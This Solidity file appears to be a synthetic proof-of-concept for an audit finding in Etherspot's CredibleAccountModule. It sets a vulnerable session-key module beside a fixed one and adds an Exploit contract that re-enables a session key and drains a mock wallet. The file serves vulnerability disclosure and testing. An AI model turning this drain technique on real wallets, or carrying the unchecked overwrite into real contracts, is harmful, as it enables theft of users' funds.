// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Etherspot CredibleAccountModule.enableSessionKey — no session-key uniqueness
    (Shieldify, C-01, July 2025, commit d4774db).
    SYNTHETIC, cheatcode-free. One transaction, no warp.
    A second enable of the same session key overwrites sessionData. The first
    validUntil is replaced, and the new lock lets that key pull N = 1,000
    from the wallet. The first registration only locked 100.
    Control reverts when sessionData is already live, so the 1,000 pull fails. */

contract Token {
    string public constant name = "Wallet";
    string public constant symbol = "WAL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct SessionData {
    address sessionKey;
    uint48 validAfter;
    uint48 validUntil;
    bool live;
}

struct LockedToken {
    address token;
    uint256 lockedAmount;
    uint256 claimedAmount;
}

contract CredibleAccountModule {
    mapping(address => mapping(address => SessionData)) public sessionData;
    mapping(address => LockedToken[]) internal _locks;
    mapping(address => address) public sessionKeyToWallet;

    error InvalidSessionKey();
    error InvalidValidAfter();
    error InvalidValidUntil();
    error NoMatchingLock();

    function validUntilOf(address sessionKey, address wallet) external view returns (uint48) {
        return sessionData[sessionKey][wallet].validUntil;
    }

    function enableSessionKey(
        address sessionKey,
        uint48 validAfter,
        uint48 validUntil,
        address token,
        uint256 amount
    ) external {
        if (sessionKey == address(0)) revert InvalidSessionKey();
        if (validAfter == 0) revert InvalidValidAfter();
        if (validUntil == 0 || validUntil <= validAfter) revert InvalidValidUntil();
        // FIX: if (sessionData[sessionKey][msg.sender].live) revert();
        // @> VULN: a second enable of this session key overwrites the first sessionData
        sessionData[sessionKey][msg.sender] = SessionData(sessionKey, validAfter, validUntil, true);
        if (amount > 0) {
            _locks[sessionKey].push(LockedToken(token, amount, 0));
        }
        sessionKeyToWallet[sessionKey] = msg.sender;
    }

    function spend(address sessionKey, address wallet, address token, address to, uint256 amount) external {
        SessionData memory sd = sessionData[sessionKey][wallet];
        require(sd.live, "not live");
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].token == token && tokens[i].lockedAmount == amount && tokens[i].claimedAmount == 0) {
                tokens[i].claimedAmount = amount;
                Token(token).transferFrom(wallet, to, amount);
                return;
            }
        }
        revert NoMatchingLock();
    }
}

contract CredibleAccountModuleFixed {
    mapping(address => mapping(address => SessionData)) public sessionData;
    mapping(address => LockedToken[]) internal _locks;
    mapping(address => address) public sessionKeyToWallet;

    error InvalidSessionKey();
    error InvalidValidAfter();
    error InvalidValidUntil();
    error SessionKeyAlreadyLive(address sessionKey);
    error NoMatchingLock();

    function validUntilOf(address sessionKey, address wallet) external view returns (uint48) {
        return sessionData[sessionKey][wallet].validUntil;
    }

    function enableSessionKey(
        address sessionKey,
        uint48 validAfter,
        uint48 validUntil,
        address token,
        uint256 amount
    ) external {
        if (sessionKey == address(0)) revert InvalidSessionKey();
        if (validAfter == 0) revert InvalidValidAfter();
        if (validUntil == 0 || validUntil <= validAfter) revert InvalidValidUntil();
        if (sessionData[sessionKey][msg.sender].live) revert SessionKeyAlreadyLive(sessionKey);
        sessionData[sessionKey][msg.sender] = SessionData(sessionKey, validAfter, validUntil, true);
        if (amount > 0) {
            _locks[sessionKey].push(LockedToken(token, amount, 0));
        }
        sessionKeyToWallet[sessionKey] = msg.sender;
    }

    function spend(address sessionKey, address wallet, address token, address to, uint256 amount) external {
        SessionData memory sd = sessionData[sessionKey][wallet];
        require(sd.live, "not live");
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].token == token && tokens[i].lockedAmount == amount && tokens[i].claimedAmount == 0) {
                tokens[i].claimedAmount = amount;
                Token(token).transferFrom(wallet, to, amount);
                return;
            }
        }
        revert NoMatchingLock();
    }
}

contract Exploit {
    uint256 public constant FIRST_LOCK = 100 ether;
    uint256 public constant N = 1_000 ether;
    uint48 public constant FIRST_UNTIL = 1_800_000_000;
    uint48 public constant SECOND_UNTIL = 1_900_000_000;

    Token public token;
    CredibleAccountModule public module;
    address public sessionKey;
    uint48 public storedUntil;
    uint256 public spent;

    constructor() {
        token = new Token();
        module = new CredibleAccountModule();
        sessionKey = address(0x3333333333333333333333333333333333333333);
    }

    function run() external {
        token.mint(address(this), N);
        token.approve(address(module), N);
        module.enableSessionKey(sessionKey, 1, FIRST_UNTIL, address(token), FIRST_LOCK);
        uint48 firstUntil = module.validUntilOf(sessionKey, address(this));
        require(firstUntil == FIRST_UNTIL, "first window");
        module.enableSessionKey(sessionKey, 1, SECOND_UNTIL, address(token), N);
        storedUntil = module.validUntilOf(sessionKey, address(this));
        require(storedUntil == SECOND_UNTIL, "first window overwritten");
        require(storedUntil != FIRST_UNTIL, "first key kept its window");
        module.spend(sessionKey, address(this), address(token), msg.sender, N);
        spent = token.balanceOf(msg.sender);
        require(spent == N, "attacker key spent the wallet");
        require(token.balanceOf(address(this)) == 0, "wallet drained");
    }
}
